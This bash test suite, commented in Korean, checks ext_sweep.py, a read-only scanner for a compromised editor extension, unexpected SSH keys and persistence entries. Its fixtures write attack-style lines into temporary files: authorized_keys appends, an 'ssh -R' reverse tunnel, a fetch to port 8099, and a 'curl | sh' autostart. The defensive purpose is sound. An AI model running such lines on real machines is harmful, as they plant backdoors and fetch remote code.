#!/usr/bin/env bash
# test.sh — ext_sweep.py 단위 테스트. 키·모델·네트워크 없이 돈다. 이 폴더에서 `bash test.sh`.
set -u
cd "$(dirname "${BASH_SOURCE[0]}")"
HERE="$(pwd)"
S="python3 -I $HERE/ext_sweep.py"
pass=0; fail=0
T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT
H="$T/home"

expect() { # $1=label $2=기대 종료코드 $3=출력에 있어야 할 문자열 $4=있으면 안 되는 문자열 ; 나머지=명령
  local label="$1" want="$2" needle="$3" absent="$4"; shift 4
  local out rc; out="$("$@" 2>&1)"; rc=$?
  if [ "$rc" -eq "$want" ] && { [ -z "$needle" ] || [[ "$out" == *"$needle"* ]]; } && { [ -z "$absent" ] || [[ "$out" != *"$absent"* ]]; }; then
    pass=$((pass+1)); echo "  ✅ $label (exit=$rc)"
  else
    fail=$((fail+1)); echo "  ❌ $label (exit=$rc, expected $want, needle='$needle', absent='$absent')"; echo "$out" | sed 's/^/      /'
  fi
}
old() { touch -d '2020-01-01' "$@"; }          # 오래된 파일로 만들어 "최근 수정" 규칙을 피한다
mk() { rm -rf "$H"; mkdir -p "$H"; }
ext() { # $1=에디터 점 폴더 $2=확장 폴더 이름 $3=package.json 버전(생략 시 폴더 이름과 같게 둘 수 없으니 필수)
  local d="$H/$1/extensions/$2/extension"; mkdir -p "$d"
  printf '{"name":"claude-code","publisher":"anthropic","version":"%s"}\n' "$3" > "$d/package.json"
  printf 'console.log("hello");\n' > "$d/extension.js"
  old "$d/package.json" "$d/extension.js"
}
KEY1='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl me@laptop'
KEY2='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHkSzr4tYtXk1b5r0n7ZPqkLfQWm3cTr8vN2dEa9Xb7P'
authkeys() { mkdir -p "$H/.ssh"; printf '%s\n' "$@" > "$H/.ssh/authorized_keys"; old "$H/.ssh/authorized_keys"; }

echo "== 깨끗한 HOME"
mk
expect "빈 HOME은 신호 없음, 확장 없음 안내" 0 "확장 폴더를 찾지 못했다" "" $S --home "$H"
mk; ext .cursor anthropic.claude-code-2.1.311-darwin-arm64 2.1.311
expect "정상 버전만 있으면 0 (INFO는 -v로만 표시)" 0 "신호 없음" "ext-installed" $S --home "$H"
expect "-v면 설치된 버전을 보여 준다" 0 "버전 2.1.311 (darwin-arm64)" "" $S --home "$H" -v

echo "== 영향 버전"
mk; ext .cursor anthropic.claude-code-2.1.312-darwin-arm64 2.1.312
expect "2.1.312 폴더는 HIGH ext-bad-version" 2 "ext-bad-version" "" $S --home "$H"
expect "HIGH면 대응 순서를 출력" 2 "다른 기기에서 새로 발급" "" $S --home "$H"
mk; ext .vscode anthropic.claude-code-2.1.313-win32-x64 2.1.313
expect "2.1.313(win32 접미사)도 HIGH" 2 "2.1.313" "" $S --home "$H"
mk; ext .windsurf Anthropic.Claude-Code-2.1.313 2.1.313
expect "대소문자가 달라도 잡는다" 2 "ext-bad-version" "" $S --home "$H"
mk; ext .cursor anthropic.claude-code-2.1.315 2.1.315
expect "--bad-version으로 다른 버전을 지정" 2 "ext-bad-version" "" $S --home "$H" --bad-version 2.1.315
expect "--bad-version을 주면 기본 버전은 빠진다" 0 "신호 없음" "" $S --home "$H" --bad-version 2.1.312
mk; ext .cursor some.other-extension-2.1.312 2.1.312
expect "다른 확장의 같은 버전은 무시" 0 "신호 없음" "" $S --home "$H"
mk; ext .cursor-fake anthropic.claude-code-2.1.312 2.1.312
expect "목록에 없는 에디터 폴더는 보지 않는다" 0 "신호 없음" "" $S --home "$H"

echo "== 버전 재사용(폴더 이름과 package.json 불일치)"
mk; ext .cursor anthropic.claude-code-2.1.311-darwin-arm64 2.1.313
expect "폴더는 정상인데 package.json이 2.1.313이면 HIGH" 2 "package.json 버전 2.1.313" "" $S --home "$H"
mk; ext .cursor anthropic.claude-code-2.1.311-darwin-arm64 2.1.299
expect "불일치만이면 MEDIUM ext-version-mismatch" 1 "ext-version-mismatch" "[HIGH" $S --home "$H"
mk; mkdir -p "$H/.cursor/extensions/anthropic.claude-code-2.1.311/extension"
expect "package.json이 없으면 MEDIUM" 1 "ext-manifest-missing" "[HIGH" $S --home "$H"

echo "== 확장 파일 안의 문자열"
mk; ext .cursor anthropic.claude-code-2.1.311 2.1.311
printf 'fs.appendFileSync(os.homedir()+"/.ssh/authorized_keys", key);\n' > "$H/.cursor/extensions/anthropic.claude-code-2.1.311/extension/extension.js"
expect "authorized_keys 문자열은 HIGH" 2 "ext-authkeys-string" "" $S --home "$H"
mk; ext .cursor anthropic.claude-code-2.1.311 2.1.311
printf 'exec("ssh -N -R 2222:localhost:22 user@203.0.113.7")\n' > "$H/.cursor/extensions/anthropic.claude-code-2.1.311/extension/extension.js"
expect "ssh -R 역방향 터널 문자열은 HIGH" 2 "ext-reverse-tunnel" "" $S --home "$H"
mk; ext .cursor anthropic.claude-code-2.1.311 2.1.311
printf 'const p = path.join(home, "Library/LaunchAgents/x.plist");\n' > "$H/.cursor/extensions/anthropic.claude-code-2.1.311/extension/extension.js"
expect "LaunchAgents 문자열은 MEDIUM" 1 "ext-persistence-string" "[HIGH" $S --home "$H"
mk; ext .cursor anthropic.claude-code-2.1.311 2.1.311
printf 'fetch("http://198.51.100.9:8099/report")\n' > "$H/.cursor/extensions/anthropic.claude-code-2.1.311/extension/extension.js"
expect "호스트:8099 문자열은 MEDIUM ext-port-string" 1 "ext-port-string" "[HIGH" $S --home "$H"
expect "--port를 바꾸면 8099는 더 이상 신호가 아니다" 0 "신호 없음" "" $S --home "$H" --port 9999
mk; ext .cursor anthropic.claude-code-2.1.311 2.1.311
printf 'const v = "18099"; const w = 80990;\n' > "$H/.cursor/extensions/anthropic.claude-code-2.1.311/extension/extension.js"
expect "18099·80990 같은 긴 숫자는 포트로 보지 않는다" 0 "신호 없음" "" $S --home "$H"
mk; ext .cursor anthropic.claude-code-2.1.311 2.1.311
printf 'authorized_keys\n' > "$H/.cursor/extensions/anthropic.claude-code-2.1.311/extension/notes.txt"
expect "스캔 대상 확장자가 아닌 파일(.txt)은 읽지 않는다" 0 "신호 없음" "" $S --home "$H"
mk; ext .cursor anthropic.claude-code-2.1.311 2.1.311
mkdir -p "$T/outside"; printf 'authorized_keys\n' > "$T/outside/evil.js"
ln -s "$T/outside" "$H/.cursor/extensions/anthropic.claude-code-2.1.311/extension/linked"
expect "확장 폴더 안 심볼릭 링크는 따라가지 않는다" 0 "신호 없음" "" $S --home "$H"
mk; ext .cursor anthropic.claude-code-2.1.311 2.1.311
ln -s "$T/outside" "$H/.cursor/extensions/anthropic.claude-code-2.1.312"
expect "심볼릭 링크로 된 확장 폴더 자체도 건너뛴다" 0 "신호 없음" "" $S --home "$H"

echo "== authorized_keys"
mk; authkeys "$KEY1"
expect "오래된 정상 키 하나는 0" 0 "신호 없음" "" $S --home "$H"
expect "-v면 키 수와 수정 경과를 보여 준다" 0 "키 1개" "" $S --home "$H" -v
mk; mkdir -p "$H/.ssh"; printf '%s\n' "$KEY1" > "$H/.ssh/authorized_keys"
expect "방금 수정된 파일은 MEDIUM authkeys-recent" 1 "authkeys-recent" "[HIGH" $S --home "$H"
expect "--since 0이면 최근 규칙이 꺼진다" 0 "신호 없음" "" $S --home "$H" --since 0
mk; authkeys "$KEY1" "$KEY2"
expect "주석 없는 키는 MEDIUM authkeys-no-comment" 1 "authkeys-no-comment" "[HIGH" $S --home "$H"
printf '%s\n' "$KEY1" > "$T/known.txt"
expect "--known-keys 목록에 없는 키는 HIGH" 2 "authkeys-unknown" "" $S --home "$H" --known-keys "$T/known.txt"
printf '%s\n' "$KEY1" "$KEY2" > "$T/known.txt"
expect "목록에 둘 다 있으면 0" 0 "신호 없음" "" $S --home "$H" --known-keys "$T/known.txt"
FP="$(python3 -I - "$HERE" <<'PY'
import sys; sys.path.insert(0, sys.argv[1])
import ext_sweep
print(ext_sweep.parse_key_line("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHkSzr4tYtXk1b5r0n7ZPqkLfQWm3cTr8vN2dEa9Xb7P")["fp"])
PY
)"
printf '%s\n' "$KEY1" "$FP" > "$T/known.txt"
expect "목록에 SHA256 지문으로 적어도 인식" 0 "신호 없음" "" $S --home "$H" --known-keys "$T/known.txt"
mk; authkeys 'command="/tmp/x.sh",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHkSzr4tYtXk1b5r0n7ZPqkLfQWm3cTr8vN2dEa9Xb7P bot'
expect "옵션(command=)이 붙은 키는 MEDIUM authkeys-options" 1 "authkeys-options" "[HIGH" $S --home "$H"
mk; authkeys '# 주석 줄' '' "$KEY1"
expect "주석·빈 줄은 키로 세지 않는다" 0 "키 1개" "" $S --home "$H" -v
expect "존재하지 않는 known-keys 파일은 64" 64 "known-keys를 읽지 못했다" "" $S --home "$H" --known-keys "$T/nope.txt"

echo "== 자동 실행 위치"
mk; mkdir -p "$H/Library/LaunchAgents"; printf '<plist><string>/usr/bin/true</string></plist>\n' > "$H/Library/LaunchAgents/com.me.job.plist"; old "$H/Library/LaunchAgents/com.me.job.plist"
expect "오래된 평범한 LaunchAgent는 0" 0 "신호 없음" "" $S --home "$H"
mk; mkdir -p "$H/Library/LaunchAgents"; printf '<plist><string>/usr/bin/true</string></plist>\n' > "$H/Library/LaunchAgents/com.me.job.plist"
expect "새로 생긴 LaunchAgent는 MEDIUM launchagent-recent" 1 "launchagent-recent" "[HIGH" $S --home "$H"
mk; mkdir -p "$H/Library/LaunchAgents"; printf '<plist><string>ssh -N -R 2222:localhost:22 u@203.0.113.7</string></plist>\n' > "$H/Library/LaunchAgents/com.me.tun.plist"; old "$H/Library/LaunchAgents/com.me.tun.plist"
expect "ssh 터널이 든 LaunchAgent는 오래돼도 HIGH" 2 "launchagent-ssh" "" $S --home "$H"
mk; mkdir -p "$H/.config/systemd/user"; printf '[Service]\nExecStart=/bin/sh -c "echo %s >> ~/.ssh/authorized_keys"\n' "$KEY2" > "$H/.config/systemd/user/up.service"; old "$H/.config/systemd/user/up.service"
expect "authorized_keys를 쓰는 systemd 유닛은 HIGH" 2 "systemd-user-ssh" "" $S --home "$H"
mk; mkdir -p "$H/.config/autostart"; printf '[Desktop Entry]\nExec=/usr/bin/curl -s http://x.example/a | sh\n' > "$H/.config/autostart/a.desktop"; old "$H/.config/autostart/a.desktop"
expect "curl | sh 자동 실행은 HIGH" 2 "autostart-ssh" "" $S --home "$H"
mk; S2="$H/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; mkdir -p "$S2"; printf '@echo off\r\nstart /b host:8099\r\n' > "$S2/run.bat"; old "$S2/run.bat"
expect "시작 프로그램 스크립트의 포트 8099는 MEDIUM" 1 "startup-folder-port" "[HIGH" $S --home "$H"
mk; mkdir -p "$H/.config/systemd/user"; printf '[Service]\nExecStart=/bin/true\n' > "$H/.config/systemd/user/readme.txt"
expect "접미사가 다른 파일은 무시" 0 "신호 없음" "" $S --home "$H"

echo "== 출력 형식과 안전성"
mk; ext .cursor anthropic.claude-code-2.1.312 2.1.312
out="$($S --home "$H" --json)"; rc=$?
if [ $rc -eq 2 ] && python3 -I -c 'import json,sys; d=json.loads(sys.argv[1]); assert d["exit"]==2 and d["findings"][0]["rule"]=="ext-bad-version"' "$out"; then
  pass=$((pass+1)); echo "  ✅ --json은 파싱되고 exit와 규칙을 담는다"
else fail=$((fail+1)); echo "  ❌ --json 출력 이상 (rc=$rc)"; echo "$out" | head -20; fi
mk; authkeys "$KEY1"
out="$($S --home "$H" -v)"
if [[ "$out" != *"AAAAC3NzaC1lZDI1NTE5"* ]]; then pass=$((pass+1)); echo "  ✅ 키 본문(base64)은 출력하지 않고 지문만 보인다"
else fail=$((fail+1)); echo "  ❌ 키 본문이 출력에 있다"; fi
mk; ext .cursor anthropic.claude-code-2.1.312 2.1.312; authkeys "$KEY1"
before="$(cd "$H" && find . -type f -printf '%p %T@\n' | sort | md5sum)"
$S --home "$H" >/dev/null
after="$(cd "$H" && find . -type f -printf '%p %T@\n' | sort | md5sum)"
if [ "$before" = "$after" ]; then pass=$((pass+1)); echo "  ✅ 점검 전후로 파일·수정 시각이 그대로다(읽기 전용)"
else fail=$((fail+1)); echo "  ❌ 점검이 파일을 바꿨다"; fi
expect "없는 HOME은 64" 64 "HOME이 폴더가 아니다" "" $S --home "$T/none"
expect "--since 음수는 64" 64 "0 이상" "" $S --home "$H" --since -1
expect "알 수 없는 옵션은 64" 64 "" "" $S --bogus
expect "--help는 0" 0 "읽기 전용" "" $S --help

echo
echo "통과 $pass · 실패 $fail"
[ "$fail" -eq 0 ]
